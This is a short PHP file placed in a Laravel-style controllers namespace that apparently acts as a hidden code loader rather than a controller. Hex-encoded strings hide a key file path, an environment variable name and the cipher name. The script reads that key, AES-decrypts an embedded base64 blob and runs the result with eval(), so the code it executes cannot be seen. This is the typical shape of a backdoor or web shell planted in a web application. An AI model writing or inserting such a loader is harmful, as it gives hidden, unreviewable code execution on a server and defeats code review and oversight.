<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('HMYgiQp33Jpoeyrp74pDzQ==');

$c=base64_decode(

'4kX/h/6wBYXDUXGN6ivvZcmRlD73F9Bd3OOAcqiIN8Pwr8NI3PFxNaASVnpjX6e5kyNQ/SeQo7Rv' .
'QM32hqZH5wmmp9utw3iUMBkLpO+S84RtSr4zPwzPEnCiRN/3RNGI68aEBTVCOrmlH58kWM/spWxq' .
'JuTX/UiGCglkRGWZJq7zROab7kxzAIw2YTtFaN3RTA0Vn4ciRKRyyXHdcyDiSV5RXkJWbzT5RNQU' .
'kIN6d1DGA9kCHf83w8sDymg275ny'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

